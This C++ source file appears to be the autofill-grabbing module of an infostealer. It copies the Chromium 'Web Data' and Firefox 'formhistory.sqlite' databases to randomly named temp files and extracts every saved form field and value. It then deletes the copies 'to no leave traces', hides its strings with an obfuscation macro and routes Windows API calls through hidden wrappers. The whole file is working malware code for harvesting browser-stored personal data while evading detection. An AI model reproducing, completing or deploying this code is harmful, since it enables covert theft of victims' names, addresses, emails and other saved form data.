#define SQLITE_STATIC
#include "Autofill.h"
#include "Browsers_EntryPoint.h"
#include "winapi_structs.h"
#include <iostream>
#include <vector>
#include "sqlite3.h"
#include <filesystem>
#include "obfusheader.h"
#include "Helper.h"

namespace fs = std::filesystem;

#pragma comment(lib, "Ole32.lib")
#pragma comment(lib, "Shell32.lib")

std::vector<Autofill> Browser::GetAutofill() {
    std::vector<Autofill> af;

    // Iterating first over Chromium
    for (const auto& Chromium : chromiumBrowsers) {
        // Keep the rest mostly the same

        fs::path autofill = fs::path(Chromium.profileLocation) / OBF("Web Data");

        if (!fs::exists(autofill)) {
            continue;
        }

        std::string tempdb = TEMP + OBF("\\") + RandomString(7) + OBF(".db");

        try {
            copy_file(autofill, tempdb, fs::copy_options::overwrite_existing);
        }
        catch (fs::filesystem_error& e) {
            continue;
        }

        sqlite3* db = nullptr;
        sqlite3_stmt* stmt = nullptr;

        HANDLE hFile = HiddenCalls::CreateFileA(tempdb.c_str(), GENERIC_READ, FILE_SHARE_READ, nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
        if (hFile == INVALID_HANDLE_VALUE) {
            std::cerr << OBF("Error: Cannot open autofill database: ") << tempdb << OBF(" (Error ") << GetLastError() << OBF(")") << std::endl;
            continue;
        }

        if (sqlite3_open(tempdb.c_str(), &db) != SQLITE_OK) {
            std::cerr << OBF("SQLite Error: ") << sqlite3_errmsg(db) << std::endl;
            sqlite3_close(db);
            HiddenCalls::CloseHandle(hFile);
            continue;
        }

        std::string query = OBF("SELECT name, value FROM autofill");
        if (sqlite3_prepare_v2(db, query.c_str(), -1, &stmt, nullptr) != SQLITE_OK) {
            sqlite3_close(db);
            HiddenCalls::CloseHandle(hFile);
            continue;
        }

        while (sqlite3_step(stmt) == SQLITE_ROW) {
            Autofill autofills;
            autofills.input = std::string(reinterpret_cast<const char*>(sqlite3_column_text(stmt, 0)));
            autofills.value = std::string(reinterpret_cast<const char*>(sqlite3_column_text(stmt, 1)));

            af.push_back(autofills);
        }

        sqlite3_finalize(stmt);
        sqlite3_close(db);
        HiddenCalls::CloseHandle(hFile);

        try {
            fs::remove(tempdb); // Deleting the temp db to no leave traces
        }
        catch (...) {}
    }

    // Now Gecko
    for (const auto& Gecko : geckoBrowsers) {
        fs::path autofill = fs::path(Gecko.profileLocation) / OBF("formhistory.sqlite");

        if (!fs::exists(autofill)) {
            continue;
        }

        std::string tempdb = TEMP + OBF("\\") + RandomString(7) + OBF(".db");

        try {
            copy_file(autofill, tempdb, fs::copy_options::overwrite_existing);
        }
        catch (fs::filesystem_error& e) {
            continue;
        }

        sqlite3* db = nullptr;
        sqlite3_stmt* stmt = nullptr;

        HANDLE hFile = HiddenCalls::CreateFileA(tempdb.c_str(), GENERIC_READ, FILE_SHARE_READ, nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
        if (hFile == INVALID_HANDLE_VALUE) {
            std::cerr << OBF("Error: Cannot open autofill database: ") << tempdb << OBF(" (Error ") << GetLastError() << OBF(")") << std::endl;
            continue;
        }

        if (sqlite3_open(tempdb.c_str(), &db) != SQLITE_OK) {
            std::cerr << OBF("SQLite Error: ") << sqlite3_errmsg(db) << std::endl;
            sqlite3_close(db);
            HiddenCalls::CloseHandle(hFile);
            continue;
        }

        std::string query = OBF("SELECT fieldname, value FROM moz_formhistory");
        if (sqlite3_prepare_v2(db, query.c_str(), -1, &stmt, nullptr) != SQLITE_OK) {
            sqlite3_close(db);
            HiddenCalls::CloseHandle(hFile);
            continue;
        }

        while (sqlite3_step(stmt) == SQLITE_ROW) {
            Autofill autofills;
            autofills.input = std::string(reinterpret_cast<const char*>(sqlite3_column_text(stmt, 0)));
            autofills.value = std::string(reinterpret_cast<const char*>(sqlite3_column_text(stmt, 1)));

            af.push_back(autofills);
        }

        sqlite3_finalize(stmt);
        sqlite3_close(db);
        HiddenCalls::CloseHandle(hFile);

        try {
            fs::remove(tempdb);
        }
        catch (...) {}
    }

    DEBUG_PRINT(L"Autofill Grabber Passed");

    return af;
}
